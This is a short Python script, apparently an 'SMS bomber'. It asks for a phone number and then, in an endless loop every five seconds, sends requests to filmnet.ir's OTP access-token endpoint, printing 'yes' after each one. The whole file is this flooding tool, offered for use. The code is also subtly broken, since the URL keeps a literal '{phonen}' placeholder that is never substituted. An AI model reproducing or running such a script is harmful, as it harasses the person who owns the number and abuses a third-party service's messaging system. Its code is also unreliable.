import requests
from termcolor import colored
import time


url1 = 'https://filmnet.ir/api-v2/access-token/users/{phonen}/otp'

phonen = input('phone number: ')

pnd = {'cellphone': f'{phonen}'}

while True:
      time.sleep(5)
      req1 = requests.get(url1, json= pnd)

      print(colored('yes', 'red'))

